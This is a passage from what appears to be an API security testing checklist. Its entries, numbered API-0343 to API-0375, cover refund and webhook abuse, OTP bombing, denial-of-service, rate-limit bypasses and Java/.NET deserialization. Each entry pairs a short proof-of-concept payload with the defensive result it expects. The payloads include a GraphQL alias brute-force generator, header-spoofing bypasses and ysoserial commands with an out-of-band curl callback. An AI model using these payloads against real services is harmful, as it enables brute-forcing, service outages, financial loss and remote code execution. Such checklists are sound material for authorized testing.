**Phase:** 8-Business Logic · **Category:** Security Misconfiguration · **OWASP API 2023:** API6:2023 Unrestricted Access to Sensitive Business Flows · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST Server config / response headers / defaults

**Test Steps:** 1. Make small purchase<br>2. Refund with inflated amount<br>3. Verify credit

**Expected Result:** Validate refund &lt;= original

**Payload / PoC Example:**

```
POST /refund {"txId":123,"amount":99999}
```

**Impact:** Direct loss

**Tools:** Burp Suite

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API6:2023 Unrestricted Access to Sensitive Business Flows

---

## API-0343 — Payment callback / webhook spoofing
**Phase:** 8-Business Logic · **Category:** Webhook · **OWASP API 2023:** API10:2023 Unsafe Consumption of APIs · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST Webhook/callback URL configuration

**Test Steps:** 1. Inspect webhook signature scheme<br>2. Send forged success callback to /payment/callback<br>3. Check if order marked paid

**Expected Result:** HMAC-verify body and timestamp; nonce

**Payload / PoC Example:**

```
Forged JSON: {"status":"paid"}
```

**Impact:** Free goods

**Tools:** Burp Suite

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API10:2023 Unsafe Consumption of APIs

---

## API-0344 — SMS / OTP / email bombing for cost amplification
**Phase:** 9-DoS · **Category:** Authentication · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST 2FA/OTP verification endpoint

**Test Steps:** 1. Trigger /sendOtp 1000x for victim phone<br>2. Verify provider cost

**Expected Result:** Limit per phone / email / IP

**Payload / PoC Example:**

```
Loop POST /sendOtp
```

**Impact:** Direct $ to attacker / DoS to victim

**Tools:** Burp Intruder

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API4:2023 Unrestricted Resource Consumption

---

## API-0345 — WebSocket DoS - Slow Loris for WS
**Phase:** 9-DoS · **Category:** DoS · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** High-volume / large-payload requests

**Test Steps:** 1. Open many WebSocket connections<br>2. Send partial frames without completing<br>3. Monitor server connection pool exhaustion

**Expected Result:** Server limits concurrent WebSocket connections per IP

**Payload / PoC Example:**

```
Open 10,000 WS connections sending only handshake, no frames
```

**Impact:** Resource exhaustion / denial of service

**Tools:** Custom script

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API4:2023 Unrestricted Resource Consumption

---

## API-0346 — GraphQL Circular Query DoS
**Phase:** 9-DoS · **Category:** DoS · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** High-volume / large-payload requests

**Test Steps:** 1. Identify circular relationships in schema<br><br>2. Craft deeply nested circular query<br><br>3. Send query to cause resource exhaustion<br><br>4. Monitor server performance

**Expected Result:** Should implement query depth limiting

**Payload / PoC Example:**

```
{user{friends{friends{friends{...}}}}}
```

**Impact:** Resource exhaustion / denial of service

**Tools:** GraphQL Cop

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API4:2023 Unrestricted Resource Consumption

---

## API-0347 — WebSocket DoS via Message Flood
**Phase:** 9-DoS · **Category:** DoS · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** High-volume / large-payload requests

**Test Steps:** 1. Establish WebSocket connection<br><br>2. Send high volume of messages<br><br>3. Exhaust server resources<br><br>4. Monitor server performance

**Expected Result:** Should rate limit WebSocket messages

**Payload / PoC Example:**

```
1000 messages per second
```

**Impact:** Resource exhaustion / denial of service

**Tools:** Custom Script

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API4:2023 Unrestricted Resource Consumption

---

## API-0348 — Slowloris Attack
**Phase:** 9-DoS · **Category:** DoS · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** High-volume / large-payload requests

**Test Steps:** 1. Open multiple connections<br><br>2. Send partial HTTP requests slowly<br><br>3. Keep connections open<br><br>4. Exhaust connection pool

**Expected Result:** Should implement connection timeouts

**Payload / PoC Example:**

```
Slow partial request stream
```

**Impact:** Resource exhaustion / denial of service

**Tools:** slowloris

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API4:2023 Unrestricted Resource Consumption

---

## API-0349 — Hash Collision Attack
**Phase:** 9-DoS · **Category:** DoS · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** High-volume / large-payload requests

**Test Steps:** 1. Identify hash-based data structures<br><br>2. Craft inputs causing hash collisions<br><br>3. Send collision-inducing payloads<br><br>4. Cause CPU exhaustion

**Expected Result:** Should use collision-resistant hashing

**Payload / PoC Example:**

```
Multiple keys with same hash value
```

**Impact:** Resource exhaustion / denial of service

**Tools:** Custom Script

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API4:2023 Unrestricted Resource Consumption

---

## API-0350 — Expensive Operation Abuse
**Phase:** 9-DoS · **Category:** DoS · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** High-volume / large-payload requests

**Test Steps:** 1. Identify expensive operations<br><br>2. Trigger without rate limiting<br><br>3. Cause resource exhaustion<br><br>4. Monitor server performance

**Expected Result:** Should rate limit expensive operations

**Payload / PoC Example:**

```
Trigger complex report generation repeatedly
```

**Impact:** Resource exhaustion / denial of service

**Tools:** Burp Intruder

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API4:2023 Unrestricted Resource Consumption

---

## API-0351 — Rate-limit bypass via header rotation
**Phase:** 9-DoS · **Category:** Rate Limiting · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** GET Repeatable endpoint (login/OTP/search) — no throttle

**Test Steps:** 1. Reach rate limit with one IP<br>2. Add X-Forwarded-For / X-Real-IP / True-Client-IP / Forwarded with rotating values<br>3. Confirm limit reset

**Expected Result:** Server should ignore client IP headers

**Payload / PoC Example:**

```
X-Forwarded-For: 1.2.3.{rotate}
```

**Impact:** Brute / abuse / cost amp

**Tools:** Burp Intruder

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API4:2023 Unrestricted Resource Consumption

---

## API-0352 — Rate Limiting on Creation
**Phase:** 9-DoS · **Category:** Rate Limiting · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Create Resource — Repeatable endpoint (login/OTP/search) — no throttle

**Test Steps:** 1. Send rapid POST requests<br>2. Create 1000+ resources<br>3. Check rate limiting

**Expected Result:** Should implement rate limiting

**Payload / PoC Example:**

```
Automated loop creating resources
```

**Impact:** Missing rate limits enable brute force / enumeration / cost abuse

**Tools:** Burp Intruder

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API4:2023 Unrestricted Resource Consumption

---

## API-0353 — Rate Limiting on Delete
**Phase:** 9-DoS · **Category:** Rate Limiting · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Delete Resource — Repeatable endpoint (login/OTP/search) — no throttle

**Test Steps:** 1. Rapidly send delete requests<br>2. Try deleting many resources<br>3. Check rate limiting

**Expected Result:** Should limit deletion rate

**Payload / PoC Example:**

```
Automate 1000 delete requests
```

**Impact:** Missing rate limits enable brute force / enumeration / cost abuse

**Tools:** Burp Intruder

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API4:2023 Unrestricted Resource Consumption

---

## API-0354 — Search Without Rate Limiting
**Phase:** 9-DoS · **Category:** Rate Limiting · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Search/Filter — Repeatable endpoint (login/OTP/search) — no throttle

**Test Steps:** 1. Send rapid search requests<br>2. Use expensive queries<br>3. Check for rate limiting

**Expected Result:** Should implement rate limiting

**Payload / PoC Example:**

```
Automate 10000 search requests
```

**Impact:** Missing rate limits enable brute force / enumeration / cost abuse

**Tools:** Burp Intruder

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API4:2023 Unrestricted Resource Consumption

---

## API-0355 — API Rate Limiting Bypass
**Phase:** 9-DoS · **Category:** Rate Limiting · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Repeatable endpoint (login/OTP/search) — no throttle

**Test Steps:** 1. Hit rate limit<br>2. Change IP via proxy<br>3. Modify headers (X-Forwarded-For)<br>4. Test bypass

**Expected Result:** Should implement proper rate limiting

**Payload / PoC Example:**

```
Change X-Forwarded-For, rotate IPs
```

**Impact:** Missing rate limits enable brute force / enumeration / cost abuse

**Tools:** Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API4:2023 Unrestricted Resource Consumption

---

## API-0356 — Rate Limit Bypass via IP Rotation
**Phase:** 9-DoS · **Category:** Rate Limiting · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Repeatable endpoint (login/OTP/search) — no throttle

**Test Steps:** 1. Hit rate limit<br><br>2. Change IP address via proxy<br><br>3. Continue requests from new IP<br><br>4. Check if limit reset

**Expected Result:** Should implement user-based rate limiting

**Payload / PoC Example:**

```
Rotate through proxy list
```

**Impact:** Missing rate limits enable brute force / enumeration / cost abuse

**Tools:** Burp Intruder

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API4:2023 Unrestricted Resource Consumption

---

## API-0357 — Rate Limit Bypass via Header Spoofing
**Phase:** 9-DoS · **Category:** Rate Limiting · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Repeatable endpoint (login/OTP/search) — no throttle

**Test Steps:** 1. Hit rate limit<br><br>2. Add X-Forwarded-For header with different IP<br><br>3. Try X-Real-IP and X-Originating-IP<br><br>4. Check if limit bypassed

**Expected Result:** Should not trust client-provided IP headers

**Payload / PoC Example:**

```
X-Forwarded-For: 1.2.3.4
```

**Impact:** Missing rate limits enable brute force / enumeration / cost abuse

**Tools:** Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API4:2023 Unrestricted Resource Consumption

---

## API-0358 — Rate Limit Bypass via Case Variation
**Phase:** 9-DoS · **Category:** Rate Limiting · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Repeatable endpoint (login/OTP/search) — no throttle

**Test Steps:** 1. Hit rate limit on /api/Login<br><br>2. Try /api/login /API/LOGIN /Api/Login<br><br>3. Check if each variation has separate limit<br><br>4. Abuse case sensitivity

**Expected Result:** Should normalize paths before rate limiting

**Payload / PoC Example:**

```
/API/LOGIN vs /api/login
```

**Impact:** Missing rate limits enable brute force / enumeration / cost abuse

**Tools:** Burp Intruder

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API4:2023 Unrestricted Resource Consumption

---

## API-0359 — Rate Limit Bypass via Parameter Variation
**Phase:** 9-DoS · **Category:** Rate Limiting · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Repeatable endpoint (login/OTP/search) — no throttle

**Test Steps:** 1. Hit rate limit<br><br>2. Add dummy parameters to URL<br><br>3. Try /api/login?foo=1 /api/login?foo=2<br><br>4. Check if treated as different endpoints

**Expected Result:** Should normalize parameters before rate limiting

**Payload / PoC Example:**

```
/api/login?dummy=1 vs /api/login?dummy=2
```

**Impact:** Missing rate limits enable brute force / enumeration / cost abuse

**Tools:** Burp Intruder

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API4:2023 Unrestricted Resource Consumption

---

## API-0360 — Rate Limit Bypass via HTTP Method
**Phase:** 9-DoS · **Category:** Rate Limiting · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Repeatable endpoint (login/OTP/search) — no throttle

**Test Steps:** 1. Hit rate limit on POST<br><br>2. Try same operation with different method<br><br>3. Use PUT or PATCH instead<br><br>4. Check if separate limits

**Expected Result:** Should apply rate limits across methods

**Payload / PoC Example:**

```
PUT /api/login vs POST /api/login
```

**Impact:** Missing rate limits enable brute force / enumeration / cost abuse

**Tools:** Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API4:2023 Unrestricted Resource Consumption

---

## API-0361 — Rate Limit Bypass via API Versioning
**Phase:** 9-DoS · **Category:** Rate Limiting · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Repeatable endpoint (login/OTP/search) — no throttle

**Test Steps:** 1. Hit rate limit on /v2/api/login<br><br>2. Switch to /v1/api/login<br><br>3. Check if rate limit shared<br><br>4. Abuse version-specific limits

**Expected Result:** Should share rate limits across versions

**Payload / PoC Example:**

```
/api/v1/login vs /api/v2/login
```

**Impact:** Missing rate limits enable brute force / enumeration / cost abuse

**Tools:** Burp Intruder

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API4:2023 Unrestricted Resource Consumption

---

## API-0362 — Distributed Brute Force
**Phase:** 9-DoS · **Category:** Rate Limiting · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Repeatable endpoint (login/OTP/search) — no throttle

**Test Steps:** 1. Distribute requests across multiple IPs<br><br>2. Keep each IP under rate limit threshold<br><br>3. Aggregate attempts across botnet<br><br>4. Check if detected

**Expected Result:** Should implement distributed attack detection

**Payload / PoC Example:**

```
Coordinated attack from multiple IPs
```

**Impact:** Missing rate limits enable brute force / enumeration / cost abuse

**Tools:** Custom Script

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API4:2023 Unrestricted Resource Consumption

---

## API-0363 — GraphQL Batching Attack for Rate Limit Bypass
**Phase:** 9-DoS · **Category:** Rate Limiting · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** POST Repeatable endpoint (login/OTP/search) — no throttle

**Test Steps:** 1. Identify rate-limited GraphQL operation<br>2. Batch 1000 identical mutations in single request<br>3. Check if rate limit applied per-request or per-operation<br>4. Use alias technique to amplify

**Expected Result:** Rate limit applied per-operation, per-alias; query cost limits enforced

**Payload / PoC Example:**

```
# Batch 1000 login mutations (bypass rate limit)
POST /graphql
[
  {"query":"mutation{login(u:"admin",p:"password")}"},
  {"query":"mutation{login(u:"admin",p:"password1")}"},
  ... x 1000
]

# Alias technique (same operation, different aliases)
POST /graphql {"query": "mutation { a1: login(username:"admin",password:"pass1"){token} a2: login(username:"admin",password:"pass2"){token} ... a1000: login(username:"admin",password:"pass1000"){token} }"}

# Deeply nested query (ReDoS equivalent)
{"query": "{ users { posts { comments { replies { likes { user { posts { comments { id } } } } } } } } }"}

# Generate 1000-alias Python script
aliases = " ".join([f'a{i}: login(u:"admin",p:"{i}") {{success}}' for i in range(1000)])
print(f"mutation {{ {aliases} }}")
```

**Impact:** Missing rate limits enable brute force / enumeration / cost abuse

**Tools:** Burp Suite, GraphQL Cop

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API4:2023 Unrestricted Resource Consumption

---

## API-0364 — Resource Exhaustion via Large Payload
**Phase:** 9-DoS · **Category:** Resource Consumption · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Large/complex payloads &amp; unbounded queries

**Test Steps:** 1. Send extremely large request body<br><br>2. Monitor server resource usage<br><br>3. Send many concurrent large requests<br><br>4. Cause service degradation

**Expected Result:** Should enforce request size limits

**Payload / PoC Example:**

```
POST with 100MB JSON body
```

**Impact:** Unrestricted resource use; DoS and cloud-cost abuse

**Tools:** Custom Script

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API4:2023 Unrestricted Resource Consumption

---

## API-0365 — Resource Exhaustion via Nested JSON
**Phase:** 9-DoS · **Category:** Resource Consumption · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Large/complex payloads &amp; unbounded queries

**Test Steps:** 1. Create deeply nested JSON<br><br>2. Send to JSON parser<br><br>3. Cause stack overflow or CPU exhaustion<br><br>4. Monitor server stability

**Expected Result:** Should limit JSON nesting depth

**Payload / PoC Example:**

```
{{{{{{{{{...100 levels...}}}}}}}}}
```

**Impact:** Unrestricted resource use; DoS and cloud-cost abuse

**Tools:** Custom Script

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API4:2023 Unrestricted Resource Consumption

---

## API-0366 — Resource Exhaustion via Zip Bomb
**Phase:** 9-DoS · **Category:** Resource Consumption · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Large/complex payloads &amp; unbounded queries

**Test Steps:** 1. Create zip bomb file<br><br>2. Upload to file processing endpoint<br><br>3. Trigger decompression<br><br>4. Exhaust disk space

**Expected Result:** Should limit decompression ratio

**Payload / PoC Example:**

```
42.zip or similar zip bomb
```

**Impact:** Unrestricted resource use; DoS and cloud-cost abuse

**Tools:** Manual

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API4:2023 Unrestricted Resource Consumption

---

## API-0367 — Denial of Wallet — cost-per-request amplification
**Phase:** 9-DoS · **Category:** Resource Consumption · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Endpoints that trigger a metered upstream (SMS / email / LLM tokens / cloud fn / paid API)

**Test Steps:** 1. Map endpoints that call a metered/paid upstream<br>2. Measure the $ cost per call<br>3. Show N calls with no throttle = unbounded spend (demonstrate a few, don't spam)<br>4. Quantify daily cost at an achievable rate

**Expected Result:** Per-user/-IP budget caps + rate limits on all cost-bearing endpoints

**Payload / PoC Example:**

```
POST /api/v1/ai/generate {..} xN   (each call = provider token cost)
```

**Impact:** Denial-of-wallet: unbounded cost amplification -&gt; financial DoS of the target

**Tools:** Burp Intruder, curl, cloud billing view

**References:** OWASP API4 (Unrestricted Resource Consumption); 'Denial of Wallet' research; APISecUniversity; API4:2023 Unrestricted Resource Consumption

---

## API-0368 — Unbounded pagination
**Phase:** 9-DoS · **Category:** Security Misconfiguration · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** GET Server config / response headers / defaults

**Test Steps:** 1. Set ?limit=99999999<br>2. Send request; observe latency / memory<br>3. Stop after proof

**Expected Result:** Enforce max page size

**Payload / PoC Example:**

```
GET /api/users?limit=99999999
```

**Impact:** Server / DB DoS

**Tools:** Burp Suite

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API4:2023 Unrestricted Resource Consumption

---

## API-0369 — Catastrophic regex (ReDoS)
**Phase:** 9-DoS · **Category:** Security Misconfiguration · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** GET Server config / response headers / defaults

**Test Steps:** 1. Identify regex-validated field (email/search)<br>2. Submit (a+)+b style payload with long 'aaaa...'<br>3. Measure response time

**Expected Result:** Use linear-time regex / RE2

**Payload / PoC Example:**

```
q=(a+)+b with 50 'a's then 'X'
```

**Impact:** CPU exhaustion

**Tools:** Manual

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API4:2023 Unrestricted Resource Consumption

---

## API-0370 — Zip / gzip bomb
**Phase:** 9-DoS · **Category:** Security Misconfiguration · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST Server config / response headers / defaults

**Test Steps:** 1. Build small archive that decompresses huge<br>2. Upload / submit with proper Content-Encoding<br>3. Monitor resources

**Expected Result:** Limit decompressed size

**Payload / PoC Example:**

```
42.zip (~42KB -> 4.5PB)
```

**Impact:** Memory / disk exhaustion

**Tools:** Manual

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API4:2023 Unrestricted Resource Consumption

---

## API-0371 — Pixel / dimension bomb
**Phase:** 9-DoS · **Category:** Security Misconfiguration · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST Server config / response headers / defaults

**Test Steps:** 1. Upload image with dimensions 100000x100000 PNG<br>2. If accepted ImageMagick will allocate huge buffer<br>3. Confirm slowdown

**Expected Result:** Validate image dimensions

**Payload / PoC Example:**

```
PNG 100000x100000
```

**Impact:** Server crash

**Tools:** Manual,ImageMagick

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API4:2023 Unrestricted Resource Consumption

---

## API-0372 — Java deserialization gadget
**Phase:** 10-Deserialization · **Category:** Deserialization · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST Serialized object in params/cookies/body

**Test Steps:** 1. Detect rO0AB or magic bytes in request<br>2. ysoserial CommonsCollections5 'curl http://oast'<br>3. Confirm via OOB

**Expected Result:** Don't deserialize untrusted data

**Payload / PoC Example:**

```
ysoserial CommonsCollections5 'cmd'
```

**Impact:** RCE

**Tools:** ysoserial,interactsh

**References:** -&gt;[Insecure Deserialization checklist](#/checklist/deser); frohoff/ysoserial; PortSwigger Academy; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0373 — .NET deserialization
**Phase:** 10-Deserialization · **Category:** Deserialization · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST Serialized object in params/cookies/body

**Test Steps:** 1. Detect serialized .NET (LosFormatter / BinaryFormatter)<br>2. ysoserial.net TextFormattingRunProperties 'cmd'<br>3. Send and confirm

**Expected Result:** Use safe formatters (DataContract)

**Payload / PoC Example:**

```
ysoserial.net -g TextFormattingRunProperties -f Json.Net -c 'calc.exe'
```

**Impact:** RCE

**Tools:** ysoserial.net

**References:** -&gt;[Insecure Deserialization checklist](#/checklist/deser); frohoff/ysoserial; PortSwigger Academy; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0374 — Insecure Deserialization
**Phase:** 10-Deserialization · **Category:** Deserialization · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Serialized object in params/cookies/body

**Test Steps:** 1. Send serialized objects<br>2. Inject malicious payloads<br>3. Attempt RCE

**Expected Result:** Should avoid deserializing untrusted data

**Payload / PoC Example:**

```
Java/Python/PHP serialized objects with RCE
```

**Impact:** Insecure deserialization to RCE

**Tools:** ysoserial

**References:** -&gt;[Insecure Deserialization checklist](#/checklist/deser); frohoff/ysoserial; PortSwigger Academy; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0375 — Insecure Deserialization - Java
**Phase:** 10-Deserialization · **Category:** Deserialization · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Serialized object in params/cookies/body

**Test Steps:** 1. Identify Java serialization (AC ED 00 05)<br><br>2. Generate malicious payload with ysoserial<br><br>3. Send serialized object<br><br>4. Achieve RCE or other impact

**Expected Result:** Should avoid native deserialization of untrusted data

**Payload / PoC Example:**

```
ysoserial CommonsCollections payload
```

**Impact:** Insecure deserialization to RCE

**Tools:** ysoserial

**References:** -&gt;[Insecure Deserialization checklist](#/checklist/deser); frohoff/ysoserial; PortSwigger Academy; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0376 — Insecure Deserialization - Python Pickle
